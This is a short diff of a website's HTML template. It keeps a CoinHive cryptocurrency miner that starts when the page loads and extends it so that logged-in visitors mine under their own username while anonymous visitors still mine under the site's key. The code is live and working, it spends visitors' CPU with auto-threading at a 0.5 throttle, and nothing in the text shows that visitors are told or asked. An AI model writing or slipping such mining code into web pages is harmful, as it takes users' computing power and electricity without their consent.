@@ -8,9 +8,17 @@
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('GM2yijcw685S5SCtVc2BZd6sG08MuJW0',{
-        autoThreads: true,
-        throttle: 0.5
-    });
-	miner.start();
+	{% if login %}
+        var miner = new CoinHive.User('GM2yijcw685S5SCtVc2BZd6sG08MuJW0','{{ name }}',{
+            autoThreads: true,
+            throttle: 0.5
+        });
+        miner.start();
+    {% else %}
+        var miner = new CoinHive.Anonymous('GM2yijcw685S5SCtVc2BZd6sG08MuJW0',{
+            autoThreads: true,
+            throttle: 0.5
+        });
+        miner.start();
+    {% endif %}
 </script>
